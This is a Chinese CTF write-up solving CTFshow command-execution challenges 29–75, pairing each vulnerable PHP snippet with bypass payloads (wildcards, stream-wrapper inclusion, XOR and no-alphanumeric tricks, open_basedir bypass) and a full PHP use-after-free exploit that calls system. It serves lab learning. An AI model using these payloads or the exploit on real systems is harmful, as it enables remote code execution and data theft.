---
title: CTFshow_web入门_命令执行
date: 2020-10-11 16:07:00
categories: web入门
---

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201011145217431-1144624692.png)

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201011145222740-2115787001.png)



<a href='https://www.cnblogs.com/NPFS/p/13279815.html' target='_blank'>命令执行小技巧</a>  可以先看下这篇文章，方便接下来的做题


## web 29

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

解法一：
由于过滤了flag，可以使用通配符进行绕过
在linux系统中 有一些通配符

*	匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *
  ?	匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0
  [abcd]	匹配abcd中任何一个字符
  [a-z]	表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0

PAYLOAD:c=system('cat f*');



解法二：
![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201002215554577-1787842823.png)

了解 eval函数之后

传入
c=echo "npfs";?>ctf <?php system('ls');
可以看到有 flag.php文件,之后采用include进行包含读取
payload：

?c=echo "npfs"; ?>ctf <?php include($_GET['url']);&url=php://filter/read=convert.base64-encode/resource=flag.php



## web 30

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

该题与29题的不同之处就是增加了对命令执行函数的过滤，命令执行的函数有很多

```
system()
passthru()
exec()
shell_exec()
popen()
proc_open()
pcntl_exec()
反引号 同shell_exec() 
```
这里需要注意一下，只有system函数是有回显的，其他的函数可以通过echo等显示

这里采用反引号绕过

解法一：
payload：c=echo \`cat f*`;

解法二：
payload：
?c=echo "npfs "; include($_GET['url']); ?>&url=php://filter/read=convert.base64-encode/resource=flag.php



## web  31

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

emmmmm ,过滤了空格，单引号等

**空格绕过**

```
> < <> 重定向符
%09(需要php环境)
${IFS}
$IFS$9
{cat,flag.php} //用逗号实现了空格功能
%20
%09
```

**cat被过滤**

```
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容

```



解法一：
payload: c=echo(`tac%09f*`);

解法二：
c=include($_GET["url"]);?>&url=php://filter/read=convert.base64-encode/resource=flag.php

直接单引号改双引号即可



## web 32

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

emmmmm,过滤了括号

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201002223158950-1419102854.png)

群里大佬的图

这里直接用include 进行无括号包含即可

解法一：
payload：?c=include $_GET["npfs"] ?>&npfs=php://filter/read=convert.base64-encode/resource=flag.php

解法二：
payload：

?c=include $_POST[npfs] ?>
 npfs=php://filter/read=convert.base64-encode/resource=flag.php



## web 33

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

过滤了单双引号，直接用数组作为参数即可绕过

解法一：
?c=include $_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php

解法二：
?c=include $_POST[1]?>
1=php://filter/read=convert.base64-encode/resource=flag.php



## web 34

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

emmmmm,多过滤了一个分号，不过好像没什么用。。

payload同上



## web 35

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

多过滤了一个这个符号 <  ，好像没什么用哈哈

payload继续同上



## web 36

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

过滤了数字

直接把数字1改成字符就🆗了

payload:
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php

payload:
?c=include$_POST[a]?>
a=php://filter/read=convert.base64-encode/resource=flag.php



## web 37

```php
<?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

过滤了flag ，又是 include 文件包含

利用伪协议读flag

```
data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行
```

flag.php 可以用通配符绕过

payload:
?c=data://text/plain,<?php system("cat fl*") ?>

查看源码即可得到flag

## web 38

```php
<?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

解法一：

原理同上一题，多了个php过滤，base64编码绕过即可

payload：
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTs=

## web 39

```php
<?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

同37



## web 40

```php
<?php

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

过滤了引号、美元符号、冒号，这里可以构造无参数函数进行文件读取

<a href='https://www.cnblogs.com/NPFS/p/13778333.html' target='_blank'>无参数文件读取</a>

看来上面这篇文章应该可以知道scandir(current(localeconv())) 查看当前目录所有文件名

我们可以发现flag.php在数组的倒数第二个值里，我们可以通过 array_reverse 进行逆转数组，然后用next()函数进行下一个值的读取，记得成功读取flag.php文件

payload:?c=highlight_flie(next(array_reverse(scandir(current(localeconv())))));

## web 41

```php
<?php
if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

- 过滤数字、字母、^、+、~、$、[、]、{、}、&、-【不区分大小写】
- `&` 按位与 `|`按位或 `^` 按位异或 `~`取反 为四大位运算符，其中按位异`|`没有过滤，过滤的字符是防异或、自增和取反构造字符

```python
<?php
$payload = 'phpinfo';
$length = strlen($payload);
$a = '';
$b = '';
$flag = 0;
echo '<br>';
for ($l = 0; $l < $length; $l++) {
    $flag=0;
    for ($i = 1; $i < 256; $i++) {
        if(preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i',chr($i))) continue;
        for ($j = 1; $j < 256; $j++) {
            if(preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i',chr($j))) continue;
            if ((chr($i) | chr($j)) === $payload[$l]) {
                echo urlencode(chr($i));
                $a=$a.urlencode(chr($i));
                echo '|';
                echo urlencode(chr($j));
                $b=$b.urlencode(chr($j));
                echo '=' . $payload[$l];
                echo "<br>";
                $flag=1;
                break;
            }
        }
        if($flag===1){
            break;
        }
    }
}

echo $a.'|'.$b;
```

```
c='');('%13%19%13%14%05%0D'|'%60%60%60%60%60%60')(('%03%01%14'|'%60%60%60').' '.('%06%0C%01%07%02%10%08%10'|'%60%60%60%60%2C%60%60%60'));//
c='');system("cat flag.php");//

```



![](http://img.npfs06.top/20210223163735.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

## web 42

```
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

**>/dev/null 2>&1**主要意思是不进行回显的意思，可参考<a href="https://www.cnblogs.com/tinywan/p/6025468.html" target="_blank">https://www.cnblogs.com/tinywan/p/6025468.html</a>

我们要让命令回显，那么进行命令分隔即可

```
;	//分号
|	//只执行后面那条命令
||	//只执行前面那条命令
&	//两条命令都会执行
&&	//两条命令都会执行
```

payload：cat flag.php;
payload:   cat flag.php||



## web 43

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了cat和分号,换一个文件读取命令即可，<a href='https://www.cnblogs.com/NPFS/p/13279815.html' target="_blank">命令执行绕过小技巧</a>

```
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
grep
strings
```

payload: sort flag.php||      （payload有很多，这里只列举一个）

查看源码即可得到flag



## web 44

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

多过滤了一个flag,通配符绕过即可

payload:?c=sort%20fl*||      (payload有很多，这里只列举一个）



## web 45

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

多过滤了个空格

**空格绕过**

 ```
 >` `<` `<>` 重定向符
 `%09`(需要php环境)
 `${IFS}`
 `$IFS$9`
 `{cat,flag.php}` //用逗号实现了空格功能
 `%20`
 `%09
 ```

payload： ?c=sort${IFS}fl*|| 



## web 46

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了数子，$，*等，通配符可以使用？问号，空格可用%09  （不属于数字）

payload: ?c=sort%09fl?g.php||



## web 47

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

多过滤了一些内容，自己按照表找出未被过滤的进行替代即可

payload: ?c=tac%09fl?g.php||

## web 48

```
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

同上

## web 49

```
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

同上



## web 50

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);

```

<>和?一起使用时没有回显,所以这里的？可以用反斜杠进行代替

paylaod:?c=tac<>fla\g.php||



## web 51

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

%0a是换行，同样可以进行命令分隔；tac被过滤，换nl

payload: ?c=nl<>fla\g.php%0a



## web 52

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

?c=nl${IFS}fla\g.php%0a

得到

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201007204536754-500087035.png)

emmmm 假的

看下根目录

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201007204755656-1371459921.png)

读取即可

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201007204801613-1615141084.png)



## web 53

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

更简单了，不需要命令分隔了......

payload:?c=nl${IFS}fla\g.php



## web 54

```p&#39;h&#39;p
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

**grep**

```
grep test *file   #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行
```



payload:?c=grep${IFS}%27{%27${IFS}fl???php

意思就是在 fl???php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行



## web 55

```php
<?php

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

先放payload: ?c=/???/????64%20????.???

  

**bin目录:** 

bin为binary的简写主要放置一些 [系统](http://www.2cto.com/os/)的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等

这里我们可以利用 base64 中的64 进行通配符匹配  即 /bin/base64 flag.php

得到如下：

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201008120341520-546479040.png)

base64解密，即可得到flag



看了羽大佬的WP还有一种解法

如下：payload：?c=/???/???/????2 ????.???      ---》 然后在url + /flag.php.bz2



**/usr/bin目录:**

主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。

我们可以利用/usr/bin下的**bzip2**

意思就是说我们先将flag.php文件进行压缩，然后再将其下载



## web 56

```php
<?php

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

很有趣的一道题，学到里奥新姿势，P神文章奉上<a href='https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html' target="_blank">无字母数字webshell之提高篇</a>

该题主要就是用P神文章里讲的方法来做的

首先构造一个post上传文件的数据包

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST文件上传</title>
</head>
<body>
<form action="http://17d01aae-51d9-48fe-abfb-d9ba10037d72.chall.ctf.show/" method="post" enctype="multipart/form-data">
    <!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

上传一个php文件，文件内容

```
#!/bin/sh
ls
```

注：shell程序必须以"#!/bin/sh"开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201008152238272-173745159.png)

上传抓包

抓包之后添加参数c如下，多发包几次（因为并不一定生成的临时文件的最后一个字母就是大写字母），可以看到执行了ls命令

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201008152507036-1728118952.png)

注：这里为什么要传参数，以及参数内容为什么是  .%20/???/????????[@-[] ,P神的文章已经写的很详细了

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201008153008773-334436503.png)

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201008153013526-1543313314.png)

1.php就是我们上传的可控的文件，我们传的参数c的值为 . /bin/phpXXXXXX，意思就是说匹配上传1.php文件所生成的临时文件，并执行之



可以看到flag.php文件，

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201008153335268-215914114.png)

用cat命令读取文件即可



## web 57

```php
<?php

// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```

emmmmmmmm 不会

payload奉上：

```
$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```



![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201008165536360-1775812267.png)



## web 58-65

```php
<?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

payload:

c=echo highlight_file('flag.php');
c=show_source("flag.php");
c=highlight_file("flag.php");  



## web 66

```
<?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

代码没变，里头东西变了

首先 c=print_r(scandir("/")); 查看目录结构，发现flag.txt

![](https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201008173002520-394263335.png)

payload：c=highlight_file("/flag.txt");



## web 67

emmmm.  print_r被禁了，换成 var_dump即可，做法同上

payload：c=var_dump(scandir("/"));highlight_file("/flag.txt");



## web 68-70

文件显示的代码，比如show_source、highlight_file、file_get_contents等基本都被禁了，这里换成文件包含的即可，如include、require

payload: c=var_dump(scandir("/"));include("/flag.txt");



## web 71

```php
<?php

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>
你要上天吗？
```

 $s = ob_get_contents();//得到缓冲区的数据。
 ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。

可以利用exit9);停止后面的程序

payload：c=require("/flag.txt");exit();



## web 72

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？
```

```
绕过open_basedir
#poc
c=?><?php
	$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f->__toString().' ');
}
exit(0);
?>
//通过这个发现flag在flag0.txt
//之后利用uaf的脚本进行命令执行
```

```php
c=function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
#需要通过url编码
```

![](http://img.npfs06.top/20210223170939.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## web 73

**glob**遍历目录 学到了

```
c=?><?php
	$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f->__toString().' ');
}
exit(0);
?>
```



可以发现里面有个flagc.txt文件

payload:  c=include("/flagc.txt");exit();



## web 74

文件名变成flagx.php,做法同73

## web 75

文件名是flag36.txt接下去就不会了